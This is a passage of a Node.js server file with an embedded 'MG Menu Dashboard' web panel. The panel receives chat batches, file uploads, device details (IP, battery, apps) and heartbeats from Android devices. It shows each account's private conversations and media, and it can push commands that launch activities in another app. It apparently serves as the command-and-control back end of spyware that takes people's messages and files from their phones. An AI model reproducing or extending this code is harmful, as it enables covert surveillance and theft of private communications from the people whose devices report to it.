@media (max-width:850px){.app{grid-template-columns:1fr}.side{max-height:42vh;border-right:0;border-bottom:1px solid var(--line)}.topbar{flex-direction:column}.commandbar{grid-template-columns:1fr 1fr}.cards{grid-template-columns:1fr 1fr}.content{padding:16px}}
@media (max-width:520px){.cards,.commandbar{grid-template-columns:1fr}.actions{width:100%}.btn{flex:1;text-align:center}.tabs{overflow:auto}.tab{white-space:nowrap}}
</style>
</head>
<body>
<div class="app">
  <aside class="side">
    <div class="brand"><h1>MG Menu Dashboard</h1><input id="search" class="search" placeholder="Search devices"></div>
    <div class="stats"><div class="stat"><b id="totalDevices">0</b><span>Devices</span></div><div class="stat"><b id="onlineDevices">0</b><span>Online</span></div><div class="stat"><b id="totalFiles">0</b><span>Files</span></div></div>
    <div id="devices" class="devices"></div>
  </aside>
  <main class="main">
    <div class="topbar"><div class="title"><h2 id="deviceTitle">Select a device</h2><p id="deviceSub">Accounts, chats, and files appear here.</p></div><div class="actions"><button class="btn" id="refresh">Refresh</button><button class="btn danger" id="deleteDevice">Delete device</button><a class="btn" href="/api/debug" target="_blank">Debug</a></div></div>
    <div class="tabs"><button class="tab active" data-tab="overview">Overview</button><button class="tab" data-tab="chats">Chats</button><button class="tab" data-tab="files">Files</button></div>
    <div class="commandbar"><input id="cmdTitle" value="MG Menu"><input id="cmdText" value="Launch activity"><select id="cmdAction"><option value="none">none</option><option value="launch" selected>launch</option></select><input id="cmdActivity" value="com.wepie.module.teenmode.TeenModeOpeningActivity"><button class="btn" id="sendCommand">Send</button><button class="btn danger" id="clearCommand">Clear</button></div>
    <section id="content" class="content"></section>
  </main>
</div>
<div id="modal" class="modal"><div class="modalbox"><div class="modalhead"><strong id="modalTitle"></strong><button class="btn" id="closeModal">Close</button></div><div id="modalBody" class="modalbody"></div></div></div>
<script>
const state={devices:[],selected:null,account:null,accounts:[],tab:"overview",messages:[],files:[],peer:null};
const $=id=>document.getElementById(id);
const enc=encodeURIComponent;
const fmtDate=v=>{if(!v)return "";const d=/^\\d+$/.test(String(v))?new Date(Number(v)):new Date(v);return Number.isFinite(d.getTime())?d.toLocaleString():String(v)};
const fmtBytes=n=>{n=Number(n)||0;const u=["B","KB","MB","GB"];let i=0;while(n>=1024&&i<u.length-1){n/=1024;i++}return n.toFixed(i?1:0)+" "+u[i]};
const esc=s=>String(s??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
const isImg=f=>/\\.(png|jpe?g|gif|webp|svg)$/i.test(f||"");
const isVid=f=>/\\.(mp4|webm|mov)$/i.test(f||"");
const msgTime=m=>Number(m.message_time||m.received_at||0);
const peerKey=m=>String(m.peer_uid||m.peer_name||"unknown");
const dayKey=t=>new Date(t).toDateString();
function shortTime(v){const d=new Date(Number(v)||v);return Number.isFinite(d.getTime())?d.toLocaleTimeString([], {hour:"2-digit",minute:"2-digit"}):""}
function previewText(t){const media=parseMedia(t);return media?media.label:String(t||"").replace(/\\s+/g," ").slice(0,90)}
function parseMedia(t){try{const o=JSON.parse(t);if(o&&o.url)return {url:o.url,label:o.name||"[Image]"} }catch{} return null}
function conversations(){const map=new Map();for(const m of state.messages){const key=peerKey(m);const item=map.get(key)||{key,peer_uid:m.peer_uid,peer_name:m.peer_name||"Unknown",messages:[],last:null};item.messages.push(m);if(!item.last||msgTime(m)>msgTime(item.last))item.last=m;map.set(key,item)}return [...map.values()].sort((a,b)=>msgTime(b.last)-msgTime(a.last))}
async function api(url,opts){const r=await fetch(url,opts);if(!r.ok)throw new Error(await r.text());return r.json()}
async function load(){state.devices=await api("/api/devices");if(!state.selected&&state.devices[0])state.selected=state.devices[0].device_id;renderDevices();await loadSelected()}
async function loadSelected(){if(!state.selected){renderEmpty();return}state.accounts=await api("/api/device/"+enc(state.selected)+"/accounts");if(!state.account||!state.accounts.find(a=>a.key===state.account))state.account=state.accounts[0]?.key||null;state.peer=null;await loadAccount();renderMain()}
async function loadAccount(){if(!state.selected||!state.account){state.messages=[];state.files=[];return}const base="/api/device/"+enc(state.selected)+"/account/"+enc(state.account);[state.messages,state.files]=await Promise.all([api(base+"/messages"),api(base+"/files")])}
function selectedDevice(){return state.devices.find(d=>d.device_id===state.selected)}
function selectedAccount(){return state.accounts.find(a=>a.key===state.account)}
function renderDevices(){const q=$("search").value.toLowerCase();const list=state.devices.filter(d=>(d.display_name||d.device_id||"").toLowerCase().includes(q));$("totalDevices").textContent=state.devices.length;$("onlineDevices").textContent=state.devices.filter(d=>d.online).length;$("totalFiles").textContent=state.devices.reduce((a,d)=>a+(d.file_count||0),0);$("devices").innerHTML=list.map(d=>'<button class="device '+(d.device_id===state.selected?'active':'')+'" data-id="'+esc(d.device_id)+'"><div class="devtop"><span class="dot '+(d.online?'on':'')+'"></span><span class="devname">'+esc(d.display_name||d.device_id)+'</span></div><div class="devmeta"><span>Users '+(d.account_count||0)+'</span><span>Chats '+(d.message_count||0)+'</span><span>Files '+(d.file_count||0)+'</span></div></button>').join("")||'<div class="empty">No devices</div>'}
function renderAccounts(){if(!state.accounts.length)return '<div class="empty">No accounts for this device yet</div>';return '<div class="accounts">'+state.accounts.map(a=>'<button class="account '+(a.key===state.account?'active':'')+'" data-account="'+esc(a.key)+'"><strong>'+esc(a.my_name||"Unknown account")+'</strong><span class="muted">Public ID: '+esc(a.public_id||"")+'</span><br><span class="muted">UID: '+esc(a.my_uid||"")+' • Chats '+(a.message_count||0)+' • Files '+(a.file_count||0)+'</span></button>').join("")+'</div>'}
function renderEmpty(){$("content").innerHTML='<div class="empty">No device selected</div>'}
function renderMain(){const d=selectedDevice();if(!d)return renderEmpty();const a=selectedAccount();$("deviceTitle").textContent=d.display_name||d.device_id;$("deviceSub").textContent=(d.online?"Online":"Offline")+" • "+(a?(a.my_name||a.public_id||"Unknown account"):"No account selected");document.querySelectorAll(".tab").forEach(t=>t.classList.toggle("active",t.dataset.tab===state.tab));if(state.tab==="overview")renderOverview(d,a);if(state.tab==="chats")renderChats();if(state.tab==="files")renderFiles()}
function renderOverview(d,a){const rows=[["Device ID",d.device_id],["Account name",a?.my_name],["Public ID",a?.public_id],["UID",a?.my_uid],["Model",d.model],["Brand",d.brand],["Android",d.android],["Battery",d.battery_percent!=null?d.battery_percent+"%":""],["IP",d.public_ip],["Network",d.network_type],["Apps",d.app_count],["Last seen",fmtDate(d.server_last_seen)],["Last file scan",fmtDate(d.last_track_time)],["Created",fmtDate(d.created_at)]];$("content").innerHTML=renderAccounts()+'<div class="cards"><div class="card"><span>Status</span><b>'+(d.online?'Online':'Offline')+'</b></div><div class="card"><span>Accounts</span><b>'+state.accounts.length+'</b></div><div class="card"><span>Conversations</span><b>'+conversations().length+'</b></div><div class="card"><span>Selected files</span><b>'+state.files.length+'</b></div></div><div class="toolbar"><button class="btn danger" id="deleteAccount">Delete selected user</button><button class="btn danger" id="deleteAccountChats">Delete user chats</button><button class="btn danger" id="deleteAccountFiles">Delete user files</button></div><br><div class="info-grid">'+rows.map(([k,v])=>'<div class="row"><span>'+esc(k)+'</span><strong>'+esc(v??"")+'</strong></div>').join("")+'</div>'}
function renderChats(){if(!state.account){$("content").innerHTML=renderAccounts();return}if(!state.peer)return renderChatInbox();return renderChatThread(state.peer)}
function renderChatInbox(){const convs=conversations();const tools='<div class="toolbar"><button class="btn danger" id="deleteAllChats">Delete all user chats</button></div><br>';if(!convs.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No chats for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="conv-list">'+convs.map(c=>'<button class="conv" data-peer="'+esc(c.key)+'"><div class="avatar">'+esc((c.peer_name||"?").trim().charAt(0)||"?")+'</div><div><div class="conv-name">'+esc(c.peer_name||"Unknown")+'</div><div class="muted">Public ID: '+esc(c.peer_uid||"")+'</div><div class="conv-preview">'+esc(previewText(c.last?.text))+'</div></div><div class="conv-meta"><div>'+esc(shortTime(msgTime(c.last)))+'</div><div>'+c.messages.length+' msgs</div></div></button>').join("")+'</div>'}
function renderChatThread(key){const conv=conversations().find(c=>c.key===key);if(!conv){state.peer=null;return renderChatInbox()}const msgs=[...conv.messages].sort((a,b)=>msgTime(a)-msgTime(b));let lastDay="";const body=msgs.map(m=>{const t=msgTime(m);const day=dayKey(t);const chip=day!==lastDay?'<span class="date-chip">'+esc(new Date(t).toLocaleDateString())+'</span>':"";lastDay=day;const media=parseMedia(m.text);const content=media?'<div>'+esc(media.label)+'</div><img class="bubble-img" src="'+esc(media.url)+'" alt="">':esc(m.text||"");return chip+'<div class="bubble-row '+esc(m.direction)+'"><label><input type="checkbox" class="msgcheck" value="'+esc(m.id)+'"></label><div class="bubble">'+content+'<span class="bubble-time">'+esc(shortTime(t))+'</span></div></div>'}).join("");$("content").innerHTML=renderAccounts()+'<div class="thread"><div class="thread-head"><div><button class="btn" id="backChats">Back</button> <strong>'+esc(conv.peer_name||"Unknown")+'</strong><div class="muted">Public ID: '+esc(conv.peer_uid||"")+'</div></div><div class="toolbar"><button class="btn" id="selectAllChats">Select all</button><button class="btn danger" id="deleteSelectedChats">Delete selected</button><button class="btn danger" id="deleteConversation">Delete conversation</button></div></div><div class="thread-scroll" id="threadScroll">'+body+'</div></div>';setTimeout(()=>{$("threadScroll")?.scrollTo(0,$("threadScroll").scrollHeight)},0)}
function renderFiles(){if(!state.account){$("content").innerHTML=renderAccounts();return}const tools='<div class="toolbar"><button class="btn" id="selectAllFiles">Select all</button><button class="btn danger" id="deleteSelectedFiles">Delete selected</button><button class="btn danger" id="deleteAllFiles">Delete all user files</button></div><br>';if(!state.files.length){$("content").innerHTML=renderAccounts()+tools+'<div class="empty">No files for this user</div>';return}$("content").innerHTML=renderAccounts()+tools+'<div class="grid">'+state.files.map(f=>{const url="/uploads/"+enc(f.file);const media=isImg(f.file)?'<img src="'+url+'" alt="">':isVid(f.file)?'<video src="'+url+'" muted></video>':'<span>FILE</span>';return '<div class="file"><label class="checkline" style="padding:8px 10px 0"><input type="checkbox" class="filecheck" value="'+esc(f.file)+'"><span class="muted">Select</span></label><button class="thumb" data-preview="'+esc(f.file)+'">'+media+'</button><div class="filebody"><div class="filename">'+esc(f.original||f.file)+'</div><div class="filemeta">'+fmtBytes(f.size)+' • '+esc(fmtDate(f.time))+'</div><div class="fileactions"><a class="btn" href="'+url+'" download>Download</a><button class="btn danger" data-delete-file="'+esc(f.file)+'">Delete</button></div></div></div>'}).join("")+'</div>'}
function openPreview(file){const url="/uploads/"+enc(file);$("modalTitle").textContent=file;$("modalBody").innerHTML=isImg(file)?'<img src="'+url+'" alt="">':isVid(file)?'<video src="'+url+'" controls autoplay></video>':'<a class="btn" href="'+url+'" target="_blank">Open file</a>';$("modal").classList.add("open")}
async function deletePath(path,msg){if(!confirm(msg))return;await api(path,{method:"DELETE"});await loadSelected();renderDevices()}
async function deleteSelectedChats(){const ids=[...document.querySelectorAll(".msgcheck:checked")].map(x=>Number(x.value));if(!ids.length)return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});await loadAccount();renderChats();renderDevices()}
async function deleteConversation(){const ids=conversations().find(c=>c.key===state.peer)?.messages.map(m=>m.id)||[];if(!ids.length||!confirm("Delete this conversation?"))return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});state.peer=null;await loadAccount();renderChats();renderDevices()}
async function deleteSelectedFiles(){const files=[...document.querySelectorAll(".filecheck:checked")].map(x=>x.value);if(!files.length)return;await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files})});await loadSelected()}
$("devices").onclick=e=>{const b=e.target.closest(".device");if(!b)return;state.selected=b.dataset.id;state.account=null;renderDevices();loadSelected()};
$("search").oninput=renderDevices;$("refresh").onclick=load;$("deleteDevice").onclick=()=>state.selected&&deletePath("/api/device/"+enc(state.selected),"Delete this device with all chats and files?");
document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
$("content").onclick=async e=>{const acc=e.target.closest("[data-account]");if(acc){state.account=acc.dataset.account;state.peer=null;await loadAccount();renderMain();return}const conv=e.target.closest("[data-peer]");if(conv){state.peer=conv.dataset.peer;renderChats();return}if(e.target.id==="backChats"){state.peer=null;renderChats();return}if(e.target.id==="deleteConversation")return deleteConversation();if(e.target.id==="deleteAccount")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account),"Delete selected user with all chats and files?");if(e.target.id==="deleteAccountChats"||e.target.id==="deleteAllChats")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/messages","Delete all chats for this user?");if(e.target.id==="deleteAccountFiles"||e.target.id==="deleteAllFiles")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/files","Delete all files for this user?");if(e.target.id==="selectAllChats"){document.querySelectorAll(".msgcheck").forEach(x=>x.checked=true);return}if(e.target.id==="selectAllFiles"){document.querySelectorAll(".filecheck").forEach(x=>x.checked=true);return}if(e.target.id==="deleteSelectedChats")return deleteSelectedChats();if(e.target.id==="deleteSelectedFiles")return deleteSelectedFiles();const p=e.target.closest("[data-preview]");if(p)return openPreview(p.dataset.preview);const f=e.target.closest("[data-delete-file]");if(f&&confirm("Delete this file?")){await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files:[f.dataset.deleteFile]})});await loadSelected()}};
$("sendCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:$("cmdTitle").value,text:$("cmdText").value,action:$("cmdAction").value,activity:$("cmdActivity").value})});$("sendCommand").textContent="Sent";setTimeout(()=>$("sendCommand").textContent="Send",1200)};
$("clearCommand").onclick=async()=>{await api("/panel/command",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({title:"MG Menu",text:"Server online",action:"none",activity:""})})};
$("closeModal").onclick=()=>$("modal").classList.remove("open");$("modal").onclick=e=>{if(e.target.id==="modal")$("modal").classList.remove("open")};
load().catch(err=>{$("content").innerHTML='<div class="empty">Failed to load dashboard: '+esc(err.message)+'</div>'});
</script>
</body>
</html>`;
}

async function handler(req, res) {
  const url = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  if (req.method === "OPTIONS") {
    res.writeHead(204, {
      "access-control-allow-origin": "*",
      "access-control-allow-methods": "GET,POST,DELETE,OPTIONS",
      "access-control-allow-headers": "content-type,x-device-id,x-filename,x-file-name"
    });
    return res.end();
  }

  try {
    if (req.method === "GET" && url.pathname === "/") return text(res, 200, await dashboardHtml(), "text/html; charset=utf-8");
    if (req.method === "GET" && url.pathname === "/config") return text(res, 200, readConfigFlag());
    if (req.method === "GET" && url.pathname === "/file-types") return text(res, 200, readConfigFileTypes().join(","));
    if (req.method === "GET" && url.pathname === "/file-max-size") return text(res, 200, String(readConfigMaxFileSizeBytes()));
    if (req.method === "POST" && url.pathname === "/api/heartbeat") return await handleHeartbeat(req, res);
    if (req.method === "POST" && url.pathname === "/api/chat/batch") return await handleChatBatch(req, res);
    if (req.method === "POST" && url.pathname === "/track") return await handleTrack(req, res);
    if (req.method === "POST" && url.pathname === "/upload") return await handleUpload(req, res, url);
    if (req.method === "GET" && url.pathname === "/api/files") return json(res, 200, getFiles(clean(url.searchParams.get("device_id") || url.searchParams.get("id"))));
    if (req.method === "GET" && url.pathname === "/api/all-files") return json(res, 200, getFiles());
    if (req.method === "GET" && url.pathname.startsWith("/uploads/")) return sendFile(res, UPLOAD_DIR, url.pathname.slice("/uploads/".length));
    if (req.method === "GET" && url.pathname.startsWith("/thumbs/")) return sendFile(res, THUMB_DIR, url.pathname.slice("/thumbs/".length));
    if (req.method === "DELETE" && url.pathname.startsWith("/api/file/")) return json(res, 200, { ok: true, deleted: deleteFilesByNames([url.pathname.slice("/api/file/".length)]) });
    if (req.method === "GET" && url.pathname === "/api/debug") return json(res, 200, { ok: true, devices: await dashboardData(), messages: await getMessages(), files: getFiles(), accounts: readAccounts(), message_meta: readMessageMeta(), tracks: readTracks(), command, config: readConfigFlag() });
    if (req.method === "POST" && url.pathname === "/panel/command") {
      const body = await readJson(req);
      command = {
        title: Object.hasOwn(body, "title") ? clean(body.title) : command.title,
        text: Object.hasOwn(body, "text") ? clean(body.text) : Object.hasOwn(body, "message") ? clean(body.message) : command.text,
        action: Object.hasOwn(body, "action") ? clean(body.action) : command.action,
        activity: Object.hasOwn(body, "activity") ? clean(body.activity) : command.activity
      };
      return json(res, 200, { ok: true, command });
    }
    if (req.method === "GET" && url.pathname === "/api/data") return json(res, 200, command);

    const handled = await handleDashboardApi(req, res, url);
    if (handled !== false) return;
    return notFound(res);
  } catch (error) {
    console.error(`${req.method} ${url.pathname}:`, error);
    return json(res, 500, { ok: false, error: error.message || "Internal server error" });
  }
}

http.createServer(handler).listen(PORT, () => {
  console.log(`MG Menu server running on port ${PORT}`);
});
